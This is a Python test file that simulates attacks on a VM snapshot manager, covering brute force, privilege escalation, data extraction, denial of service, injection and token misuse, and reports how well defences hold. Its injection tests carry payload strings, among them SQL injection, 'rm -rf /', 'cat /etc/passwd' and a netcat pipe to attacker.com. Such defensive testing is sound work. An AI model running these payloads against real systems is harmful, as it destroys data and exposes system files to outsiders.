"""
Advanced attack simulation framework for VM Snapshot Manager.

Simulates real-world attacks and penetration testing scenarios
to validate security controls and incident response.
"""

import pytest
import asyncio
import time
import secrets
import random
from typing import List, Dict, Any, Optional
from unittest.mock import AsyncMock, MagicMock, patch
from dataclasses import dataclass
from enum import Enum

import sys
from pathlib import Path
current_dir = Path(__file__).parent
parent_dir = current_dir.parent.parent
sys.path.insert(0, str(parent_dir))

from core.snapshot_manager import SnapshotManager
from api.auth import AuthenticationMiddleware, RateLimiter


class AttackType(Enum):
    """Types of simulated attacks."""
    BRUTE_FORCE = "brute_force"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DATA_EXFILTRATION = "data_exfiltration"
    DENIAL_OF_SERVICE = "denial_of_service"
    INJECTION = "injection"
    UNAUTHORIZED_ACCESS = "unauthorized_access"


class AttackSeverity(Enum):
    """Severity levels for attacks."""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class AttackResult:
    """Result of an attack simulation."""
    attack_type: AttackType
    severity: AttackSeverity
    success: bool
    description: str
    details: Dict[str, Any]
    mitigation_effectiveness: float  # 0-1 scale
    remediation: Optional[str] = None


class AttackSimulator:
    """
    Advanced attack simulation framework.
    
    Simulates sophisticated attacks to test security controls
    and validate defensive mechanisms.
    """
    
    def __init__(self, snapshot_manager: SnapshotManager,
                 auth_middleware: AuthenticationMiddleware):
        """Initialize attack simulator."""
        self.snapshot_manager = snapshot_manager
        self.auth_middleware = auth_middleware
        self.attack_results: List[AttackResult] = []
        
        # Attack configuration
        self.attack_intensity = "medium"
        self.max_attack_duration = 30  # seconds
        self.concurrent_attacks = 5
        
    async def simulate_all_attacks(self) -> List[AttackResult]:
        """Run all attack simulations."""
        self.attack_results.clear()
        
        # Run different types of attacks
        await self._simulate_brute_force_attacks()
        await self._simulate_privilege_escalation_attacks()
        await self._simulate_data_exfiltration_attacks()
        await self._simulate_denial_of_service_attacks()
        await self._simulate_injection_attacks()
        await self._simulate_unauthorized_access_attacks()
        
        return self.attack_results
    
    async def _simulate_brute_force_attacks(self):
        """Simulate brute force attacks."""
        
        # Attack 1: Authentication brute force
        try:
            start_time = time.time()
            successful_auths = 0
            failed_auths = 0
            rate_limited = False
            
            # Common password list
            common_passwords = [
                "password", "123456", "admin", "root", "test",
                "password123", "admin123", "qwerty", "letmein",
                "welcome", "monkey", "dragon", "master", "shadow"
            ]
            
            for password in common_passwords:
                if time.time() - start_time > self.max_attack_duration:
                    break
                
                try:
                    # Simulate authentication attempt
                    import jwt
                    fake_token = jwt.encode({
                        'user_id': 'admin',
                        'password': password,
                        'exp': int(time.time()) + 3600
                    }, password, algorithm="HS256")
                    
                    from fastapi.security import HTTPAuthorizationCredentials
                    creds = HTTPAuthorizationCredentials(scheme="Bearer", credentials=fake_token)
                    
                    await self.auth_middleware.authenticate_user(creds)
                    successful_auths += 1
                    
                except Exception as e:
                    failed_auths += 1
                    if "rate limit" in str(e).lower():
                        rate_limited = True
                        break
                
                # Small delay to simulate realistic attack timing
                await asyncio.sleep(0.1)
            
            attack_blocked = rate_limited or successful_auths == 0
            
            self.attack_results.append(AttackResult(
                attack_type=AttackType.BRUTE_FORCE,
                severity=AttackSeverity.HIGH,
                success=not attack_blocked,
                description=f"Authentication brute force: {successful_auths} successful, {failed_auths} failed",
                details={
                    "successful_auths": successful_auths,
                    "failed_auths": failed_auths,
                    "rate_limited": rate_limited,
                    "duration": time.time() - start_time
                },
                mitigation_effectiveness=1.0 if attack_blocked else 0.0,
                remediation="Implement account lockout and rate limiting" if not attack_blocked else None
            ))
            
        except Exception as e:
            self.attack_results.append(AttackResult(
                attack_type=AttackType.BRUTE_FORCE,
                severity=AttackSeverity.HIGH,
                success=False,
                description=f"Brute force attack simulation failed: {str(e)}",
                details={"error": str(e)},
                mitigation_effectiveness=0.5
            ))
        
        # Attack 2: Snapshot ID brute force
        try:
            start_time = time.time()
            found_snapshots = 0
            attempts = 0
            
            # Try to guess valid snapshot IDs
            for i in range(1000):  # Try 1000 IDs
                if time.time() - start_time > self.max_attack_duration:
                    break
                
                attempts += 1
                
                # Generate potential snapshot ID
                fake_id = f"snap_{secrets.token_hex(8)}"  # Shorter than real IDs
                
                try:
                    await self.snapshot_manager.get_snapshot_metadata(fake_id, "attacker_user")
                    found_snapshots += 1
                except ValueError:
                    # Expected - snapshot not found
                    pass
                except Exception:
                    # Other errors might indicate successful guess
                    found_snapshots += 1
            
            attack_success = found_snapshots > 0
            
            self.attack_results.append(AttackResult(
                attack_type=AttackType.BRUTE_FORCE,
                severity=AttackSeverity.MEDIUM,
                success=attack_success,
                description=f"Snapshot ID brute force: {found_snapshots}/{attempts} successful",
                details={
                    "found_snapshots": found_snapshots,
                    "total_attempts": attempts,
                    "success_rate": found_snapshots / attempts if attempts > 0 else 0
                },
                mitigation_effectiveness=0.0 if attack_success else 1.0,
                remediation="Use longer, cryptographically secure IDs" if attack_success else None
            ))
            
        except Exception as e:
            self.attack_results.append(AttackResult(
                attack_type=AttackType.BRUTE_FORCE,
                severity=AttackSeverity.MEDIUM,
                success=False,
                description=f"Snapshot ID brute force failed: {str(e)}",
                details={"error": str(e)},
                mitigation_effectiveness=0.5
            ))
    
    async def _simulate_privilege_escalation_attacks(self):
        """Simulate privilege escalation attacks."""
        
        # Attack 1: Horizontal privilege escalation
        try:
            # Create snapshots for different users
            user1_snapshot = await self.snapshot_manager.create_snapshot(
                vm_id="vm_user1_test",
                user_id="user1",
                name="user1-snapshot",
                description="User 1 snapshot"
            )
            
            user2_snapshot = await self.snapshot_manager.create_snapshot(
                vm_id="vm_user2_test", 
                user_id="user2",
                name="user2-snapshot",
                description="User 2 snapshot"
            )
            
            # Try cross-user access
            cross_access_attempts = [
                ("user1", user2_snapshot),
                ("user2", user1_snapshot),
                ("user3", user1_snapshot),
                ("user3", user2_snapshot)
            ]
            
            successful_escalations = 0
            
            for attacking_user, target_snapshot in cross_access_attempts:
                try:
                    await self.snapshot_manager.get_snapshot_metadata(target_snapshot, attacking_user)
                    successful_escalations += 1
                except ValueError:
                    # Expected - access denied
                    pass
                except Exception:
                    # Other errors might indicate successful access
                    successful_escalations += 1
            
            attack_success = successful_escalations > 0
            
            self.attack_results.append(AttackResult(
                attack_type=AttackType.PRIVILEGE_ESCALATION,
                severity=AttackSeverity.CRITICAL,
                success=attack_success,
                description=f"Horizontal privilege escalation: {successful_escalations}/4 successful",
                details={
                    "successful_escalations": successful_escalations,
                    "total_attempts": len(cross_access_attempts)
                },
                mitigation_effectiveness=0.0 if attack_success else 1.0,
                remediation="Implement proper user access controls" if attack_success else None
            ))
            
        except Exception as e:
            self.attack_results.append(AttackResult(
                attack_type=AttackType.PRIVILEGE_ESCALATION,
                severity=AttackSeverity.CRITICAL,
                success=False,
                description=f"Privilege escalation attack failed: {str(e)}",
                details={"error": str(e)},
                mitigation_effectiveness=0.5
            ))
        
        # Attack 2: Role-based privilege escalation
        try:
            # Try to perform admin operations with regular user permissions
            regular_permissions = ["snapshot:read", "snapshot:create"]
            
            # Simulate admin-only operations
            admin_operations = [
                "snapshot:delete_any",
                "snapshot:admin",
                "system:admin",
                "user:admin"
            ]
            
            successful_admin_ops = 0
            
            for operation in admin_operations:
                user_info = {
                    'user_id': 'regular_user',
                    'permissions': regular_permissions,
                    'roles': ['user']
                }
                
                # Check if regular user can perform admin operation
                if self.auth_middleware.check_permission(user_info, operation):
                    successful_admin_ops += 1
            
            attack_success = successful_admin_ops > 0
            
            self.attack_results.append(AttackResult(
                attack_type=AttackType.PRIVILEGE_ESCALATION,
                severity=AttackSeverity.HIGH,
                success=attack_success,
                description=f"Role privilege escalation: {successful_admin_ops}/4 admin operations allowed",
                details={
                    "successful_admin_ops": successful_admin_ops,
                    "total_admin_ops": len(admin_operations)
                },
                mitigation_effectiveness=0.0 if attack_success else 1.0,
                remediation="Implement strict role-based access control" if attack_success else None
            ))
            
        except Exception as e:
            self.attack_results.append(AttackResult(
                attack_type=AttackType.PRIVILEGE_ESCALATION,
                severity=AttackSeverity.HIGH,
                success=False,
                description=f"Role escalation attack failed: {str(e)}",
                details={"error": str(e)},
                mitigation_effectiveness=0.5
            ))
    
    async def _simulate_data_exfiltration_attacks(self):
        """Simulate data exfiltration attacks."""
        
        # Attack 1: Bulk data extraction
        try:
            start_time = time.time()
            extracted_snapshots = 0
            
            # Create multiple snapshots
            created_snapshots = []
            for i in range(10):
                snapshot_id = await self.snapshot_manager.create_snapshot(
                    vm_id=f"vm_target_{i}",
                    user_id="target_user",
                    name=f"sensitive-data-{i}",
                    description=f"Sensitive snapshot {i}"
                )
                created_snapshots.append(snapshot_id)
            
            # Try to extract all user's snapshots rapidly
            for snapshot_id in created_snapshots:
                if time.time() - start_time > self.max_attack_duration:
                    break
                
                try:
                    metadata = await self.snapshot_manager.get_snapshot_metadata(snapshot_id, "target_user")
                    extracted_snapshots += 1
                    
                    # Small delay to simulate data extraction time
                    await asyncio.sleep(0.01)
                except Exception:
                    break
            
            # Check if bulk extraction was rate limited
            extraction_rate = extracted_snapshots / (time.time() - start_time)
            rate_limited = extraction_rate < 5  # Less than 5 per second suggests rate limiting
            
            self.attack_results.append(AttackResult(
                attack_type=AttackType.DATA_EXFILTRATION,
                severity=AttackSeverity.HIGH,
                success=not rate_limited,
                description=f"Bulk data extraction: {extracted_snapshots} snapshots at {extraction_rate:.2f}/sec",
                details={
                    "extracted_snapshots": extracted_snapshots,
                    "extraction_rate": extraction_rate,
                    "rate_limited": rate_limited,
                    "duration": time.time() - start_time
                },
                mitigation_effectiveness=1.0 if rate_limited else 0.0,
                remediation="Implement rate limiting for data access" if not rate_limited else None
            ))
            
        except Exception as e:
            self.attack_results.append(AttackResult(
                attack_type=AttackType.DATA_EXFILTRATION,
                severity=AttackSeverity.HIGH,
                success=False,
                description=f"Data exfiltration attack failed: {str(e)}",
                details={"error": str(e)},
                mitigation_effectiveness=0.5
            ))
        
        # Attack 2: Metadata enumeration
        try:
            # Try to enumerate snapshot metadata to gather intelligence
            enumerated_data = {
                "vm_ids": set(),
                "user_ids": set(),
                "snapshot_patterns": [],
                "total_snapshots": 0
            }
            
            # Create diverse snapshots for enumeration
            test_snapshots = []
            for i in range(5):
                snapshot_id = await self.snapshot_manager.create_snapshot(
                    vm_id=f"vm_enum_{i}",
                    user_id=f"user_enum_{i}",
                    name=f"enum-test-{i}",
                    description=f"Enumeration test {i}"
                )
                test_snapshots.append(snapshot_id)
            
            # Enumerate metadata
            for snapshot_id in test_snapshots:
                try:
                    metadata = await self.snapshot_manager.get_snapshot_metadata(snapshot_id, f"user_enum_{len(enumerated_data['vm_ids'])}")
                    
                    enumerated_data["vm_ids"].add(metadata.vm_id)
                    enumerated_data["user_ids"].add(metadata.user_id)
                    enumerated_data["snapshot_patterns"].append(metadata.name)
                    enumerated_data["total_snapshots"] += 1
                    
                except Exception:
                    pass
            
            # Assess information disclosure
            info_disclosed = (
                len(enumerated_data["vm_ids"]) > 0 or
                len(enumerated_data["user_ids"]) > 0 or
                enumerated_data["total_snapshots"] > 0
            )
            
            self.attack_results.append(AttackResult(
                attack_type=AttackType.DATA_EXFILTRATION,
                severity=AttackSeverity.MEDIUM,
                success=info_disclosed,
                description=f"Metadata enumeration: {enumerated_data['total_snapshots']} snapshots enumerated",
                details=enumerated_data,
                mitigation_effectiveness=0.0 if info_disclosed else 1.0,
                remediation="Implement metadata access controls" if info_disclosed else None
            ))
            
        except Exception as e:
            self.attack_results.append(AttackResult(
                attack_type=AttackType.DATA_EXFILTRATION,
                severity=AttackSeverity.MEDIUM,
                success=False,
                description=f"Metadata enumeration failed: {str(e)}",
                details={"error": str(e)},
                mitigation_effectiveness=0.5
            ))
    
    async def _simulate_denial_of_service_attacks(self):
        """Simulate denial of service attacks."""
        
        # Attack 1: Resource exhaustion via snapshot creation
        try:
            start_time = time.time()
            created_snapshots = 0
            quota_hit = False
            
            # Try to create many snapshots rapidly
            for i in range(100):  # Try to create 100 snapshots
                if time.time() - start_time > self.max_attack_duration:
                    break
                
                try:
                    await self.snapshot_manager.create_snapshot(
                        vm_id=f"vm_dos_{i}",
                        user_id="dos_attacker",
                        name=f"dos-snapshot-{i}",
                        description=f"DoS attack snapshot {i}"
                    )
                    created_snapshots += 1
                    
                except ValueError as e:
                    if "quota" in str(e).lower() or "limit" in str(e).lower():
                        quota_hit = True
                        break
                except Exception:
                    break
            
            attack_blocked = quota_hit or created_snapshots < 50
            
            self.attack_results.append(AttackResult(
                attack_type=AttackType.DENIAL_OF_SERVICE,
                severity=AttackSeverity.HIGH,
                success=not attack_blocked,
                description=f"Resource exhaustion: {created_snapshots} snapshots created before blocking",
                details={
                    "created_snapshots": created_snapshots,
                    "quota_hit": quota_hit,
                    "duration": time.time() - start_time
                },
                mitigation_effectiveness=1.0 if attack_blocked else 0.0,
                remediation="Implement proper resource quotas" if not attack_blocked else None
            ))
            
        except Exception as e:
            self.attack_results.append(AttackResult(
                attack_type=AttackType.DENIAL_OF_SERVICE,
                severity=AttackSeverity.HIGH,
                success=False,
                description=f"DoS attack simulation failed: {str(e)}",
                details={"error": str(e)},
                mitigation_effectiveness=0.5
            ))
        
        # Attack 2: Concurrent connection flooding
        try:
            start_time = time.time()
            concurrent_operations = []
            
            # Launch many concurrent operations
            async def concurrent_operation(operation_id):
                try:
                    return await self.snapshot_manager.create_snapshot(
                        vm_id=f"vm_flood_{operation_id}",
                        user_id="flood_attacker",
                        name=f"flood-{operation_id}",
                        description=f"Flood operation {operation_id}"
                    )
                except Exception as e:
                    return f"error:{str(e)}"
            
            # Launch concurrent attacks
            tasks = [
                asyncio.create_task(concurrent_operation(i)) 
                for i in range(self.concurrent_attacks)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            successful_ops = sum(1 for r in results if isinstance(r, str) and r.startswith("snap_"))
            failed_ops = len(results) - successful_ops
            
            # System should handle concurrent load gracefully
            system_stable = failed_ops < len(results) // 2  # Less than 50% failure rate
            
            self.attack_results.append(AttackResult(
                attack_type=AttackType.DENIAL_OF_SERVICE,
                severity=AttackSeverity.MEDIUM,
                success=not system_stable,
                description=f"Concurrent flooding: {successful_ops}/{len(results)} operations succeeded",
                details={
                    "successful_operations": successful_ops,
                    "failed_operations": failed_ops,
                    "concurrent_attacks": self.concurrent_attacks,
                    "system_stable": system_stable
                },
                mitigation_effectiveness=1.0 if system_stable else 0.0,
                remediation="Implement connection limiting and queuing" if not system_stable else None
            ))
            
        except Exception as e:
            self.attack_results.append(AttackResult(
                attack_type=AttackType.DENIAL_OF_SERVICE,
                severity=AttackSeverity.MEDIUM,
                success=False,
                description=f"Concurrent flood attack failed: {str(e)}",
                details={"error": str(e)},
                mitigation_effectiveness=0.5
            ))
    
    async def _simulate_injection_attacks(self):
        """Simulate various injection attacks."""
        
        # Attack 1: SQL injection
        sql_payloads = [
            "'; DROP TABLE snapshots; --",
            "' OR 1=1 --",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO admin_users VALUES ('hacker'); --"
        ]
        
        injection_successful = 0
        
        for payload in sql_payloads:
            try:
                await self.snapshot_manager.create_snapshot(
                    vm_id="vm_sql_injection",
                    user_id="sql_attacker",
                    name=payload,
                    description=payload
                )
                
                # If creation succeeds without proper sanitization, it's a problem
                # For this test, we assume proper input validation rejects malicious input
                
            except ValueError:
                # Expected - malicious input rejected
                pass
            except Exception:
                # Unexpected error might indicate successful injection
                injection_successful += 1
        
        self.attack_results.append(AttackResult(
            attack_type=AttackType.INJECTION,
            severity=AttackSeverity.CRITICAL,
            success=injection_successful > 0,
            description=f"SQL injection: {injection_successful}/{len(sql_payloads)} payloads successful",
            details={
                "successful_injections": injection_successful,
                "total_payloads": len(sql_payloads),
                "payloads_tested": sql_payloads
            },
            mitigation_effectiveness=0.0 if injection_successful > 0 else 1.0,
            remediation="Implement parameterized queries and input validation" if injection_successful > 0 else None
        ))
        
        # Attack 2: Command injection
        command_payloads = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`id`"
        ]
        
        command_injection_successful = 0
        
        for payload in command_payloads:
            try:
                await self.snapshot_manager.create_snapshot(
                    vm_id="vm_cmd_injection",
                    user_id="cmd_attacker", 
                    name=f"test{payload}",
                    description=f"Command injection test{payload}"
                )
            except ValueError:
                # Expected - malicious input rejected
                pass
            except Exception:
                # Unexpected error might indicate successful injection
                command_injection_successful += 1
        
        self.attack_results.append(AttackResult(
            attack_type=AttackType.INJECTION,
            severity=AttackSeverity.CRITICAL,
            success=command_injection_successful > 0,
            description=f"Command injection: {command_injection_successful}/{len(command_payloads)} payloads successful",
            details={
                "successful_injections": command_injection_successful,
                "total_payloads": len(command_payloads),
                "payloads_tested": command_payloads
            },
            mitigation_effectiveness=0.0 if command_injection_successful > 0 else 1.0,
            remediation="Implement command sanitization and avoid shell execution" if command_injection_successful > 0 else None
        ))
    
    async def _simulate_unauthorized_access_attacks(self):
        """Simulate unauthorized access attacks."""
        
        # Attack 1: Session hijacking simulation
        try:
            # Try to use invalid/expired tokens
            invalid_tokens = [
                "invalid_token_123",
                "expired_token_456", 
                "malformed.jwt.token",
                "",
                None
            ]
            
            successful_hijacks = 0
            
            for token in invalid_tokens:
                if token is None:
                    continue
                
                try:
                    from fastapi.security import HTTPAuthorizationCredentials
                    if token:
                        creds = HTTPAuthorizationCredentials(scheme="Bearer", credentials=token)
                        await self.auth_middleware.authenticate_user(creds)
                        successful_hijacks += 1
                except Exception:
                    # Expected - invalid token rejected
                    pass
            
            self.attack_results.append(AttackResult(
                attack_type=AttackType.UNAUTHORIZED_ACCESS,
                severity=AttackSeverity.HIGH,
                success=successful_hijacks > 0,
                description=f"Session hijacking: {successful_hijacks}/4 invalid tokens accepted",
                details={
                    "successful_hijacks": successful_hijacks,
                    "total_attempts": len([t for t in invalid_tokens if t is not None])
                },
                mitigation_effectiveness=0.0 if successful_hijacks > 0 else 1.0,
                remediation="Implement proper token validation" if successful_hijacks > 0 else None
            ))
            
        except Exception as e:
            self.attack_results.append(AttackResult(
                attack_type=AttackType.UNAUTHORIZED_ACCESS,
                severity=AttackSeverity.HIGH,
                success=False,
                description=f"Session hijacking simulation failed: {str(e)}",
                details={"error": str(e)},
                mitigation_effectiveness=0.5
            ))
        
        # Attack 2: Direct object reference
        try:
            # Create snapshots and try direct access
            snapshot_id = await self.snapshot_manager.create_snapshot(
                vm_id="vm_direct_ref",
                user_id="owner_user",
                name="direct-ref-test",
                description="Direct reference test"
            )
            
            # Try to access with different users
            unauthorized_users = ["attacker1", "attacker2", "admin_fake"]
            successful_access = 0
            
            for user in unauthorized_users:
                try:
                    await self.snapshot_manager.get_snapshot_metadata(snapshot_id, user)
                    successful_access += 1
                except ValueError:
                    # Expected - access denied
                    pass
                except Exception:
                    # Other errors might indicate successful access
                    successful_access += 1
            
            self.attack_results.append(AttackResult(
                attack_type=AttackType.UNAUTHORIZED_ACCESS,
                severity=AttackSeverity.HIGH,
                success=successful_access > 0,
                description=f"Direct object reference: {successful_access}/3 unauthorized accesses successful",
                details={
                    "successful_access": successful_access,
                    "total_attempts": len(unauthorized_users),
                    "snapshot_id": snapshot_id
                },
                mitigation_effectiveness=0.0 if successful_access > 0 else 1.0,
                remediation="Implement proper authorization checks" if successful_access > 0 else None
            ))
            
        except Exception as e:
            self.attack_results.append(AttackResult(
                attack_type=AttackType.UNAUTHORIZED_ACCESS,
                severity=AttackSeverity.HIGH,
                success=False,
                description=f"Direct object reference attack failed: {str(e)}",
                details={"error": str(e)},
                mitigation_effectiveness=0.5
            ))
    
    def generate_attack_report(self) -> str:
        """Generate detailed attack simulation report."""
        total_attacks = len(self.attack_results)
        successful_attacks = sum(1 for r in self.attack_results if r.success)
        
        report = f"""
# Attack Simulation Report

## Summary
- **Total Attacks Simulated**: {total_attacks}
- **Successful Attacks**: {successful_attacks}
- **Success Rate**: {(successful_attacks/total_attacks*100):.1f}%
- **Average Mitigation Effectiveness**: {(sum(r.mitigation_effectiveness for r in self.attack_results)/total_attacks*100):.1f}%

## Attack Results by Type
"""
        
        # Group by attack type
        by_type = {}
        for result in self.attack_results:
            attack_type = result.attack_type.value
            if attack_type not in by_type:
                by_type[attack_type] = []
            by_type[attack_type].append(result)
        
        for attack_type, results in by_type.items():
            successful = sum(1 for r in results if r.success)
            total = len(results)
            
            report += f"\n### {attack_type.upper()} ({successful}/{total} successful)\n"
            
            for result in results:
                status = "🔴 SUCCESS" if result.success else "🟢 BLOCKED"
                report += f"\n**{result.description}** {status}\n"
                report += f"- **Severity**: {result.severity.value.upper()}\n"
                report += f"- **Mitigation Effectiveness**: {result.mitigation_effectiveness*100:.0f}%\n"
                
                if result.remediation and result.success:
                    report += f"- **Remediation**: {result.remediation}\n"
        
        return report


# Test classes

class TestAttackSimulator:
    """Test the attack simulation framework."""
    
    @pytest.fixture
    def mock_snapshot_manager(self):
        """Mock snapshot manager for attack testing."""
        manager = AsyncMock()
        manager.max_snapshots_per_user = 50
        
        # Mock create_snapshot to generate IDs
        async def mock_create_snapshot(**kwargs):
            # Simulate quota enforcement
            if hasattr(mock_create_snapshot, 'call_count'):
                mock_create_snapshot.call_count += 1
            else:
                mock_create_snapshot.call_count = 1
            
            if mock_create_snapshot.call_count > manager.max_snapshots_per_user:
                raise ValueError("Quota exceeded")
            
            return f"snap_{secrets.token_hex(16)}"
        
        manager.create_snapshot = mock_create_snapshot
        
        # Mock get_snapshot_metadata with access control
        async def mock_get_metadata(snapshot_id, user_id):
            # Simulate access control
            if "user1" in snapshot_id and user_id != "user1":
                raise ValueError("Access denied")
            if "user2" in snapshot_id and user_id != "user2":
                raise ValueError("Access denied")
            
            # Return mock metadata
            mock_metadata = MagicMock()
            mock_metadata.snapshot_id = snapshot_id
            mock_metadata.vm_id = f"vm_{user_id}_test"
            mock_metadata.user_id = user_id
            mock_metadata.name = "test-snapshot"
            return mock_metadata
        
        manager.get_snapshot_metadata = mock_get_metadata
        return manager
    
    @pytest.fixture
    def mock_auth_middleware(self):
        """Mock auth middleware for attack testing."""
        return AuthenticationMiddleware("test_secret_key_for_attack_simulation")
    
    @pytest.fixture
    def attack_simulator(self, mock_snapshot_manager, mock_auth_middleware):
        """Attack simulator instance."""
        return AttackSimulator(mock_snapshot_manager, mock_auth_middleware)
    
    async def test_attack_simulator_initialization(self, attack_simulator):
        """Test attack simulator initializes correctly."""
        assert attack_simulator.snapshot_manager is not None
        assert attack_simulator.auth_middleware is not None
        assert attack_simulator.attack_results == []
        assert attack_simulator.max_attack_duration == 30
    
    async def test_simulate_all_attacks(self, attack_simulator):
        """Test running all attack simulations."""
        results = await attack_simulator.simulate_all_attacks()
        
        assert len(results) > 0
        assert all(isinstance(r, AttackResult) for r in results)
        assert len(set(r.attack_type for r in results)) > 1  # Multiple attack types
    
    async def test_attack_report_generation(self, attack_simulator):
        """Test attack report generation."""
        await attack_simulator.simulate_all_attacks()
        report = attack_simulator.generate_attack_report()
        
        assert "Attack Simulation Report" in report
        assert "Total Attacks Simulated" in report
        assert "Mitigation Effectiveness" in report


if __name__ == "__main__":
    pytest.main([__file__, "-v"])